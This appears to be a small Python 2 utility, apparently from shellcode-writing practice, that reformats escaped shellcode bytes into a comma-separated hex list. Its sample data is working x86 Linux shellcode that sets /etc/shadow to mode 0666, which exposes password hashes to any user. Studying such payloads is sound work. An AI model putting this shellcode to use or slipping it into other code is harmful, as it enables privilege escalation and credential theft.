#!/usr/bin/python
# Filename: formatHex.py
# Author:   boku
# Purpose:  A python script that converts the '\x' format to '0x ,'

# Add the shellcode hex here.
sc =  ""
sc += "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74"
sc += "\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01"
sc += "\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"

output = ""
print 'Encoded shellcode ...'
for x in bytearray(sc) :
        output += '0x'
        output += '%02x,' %x
print output
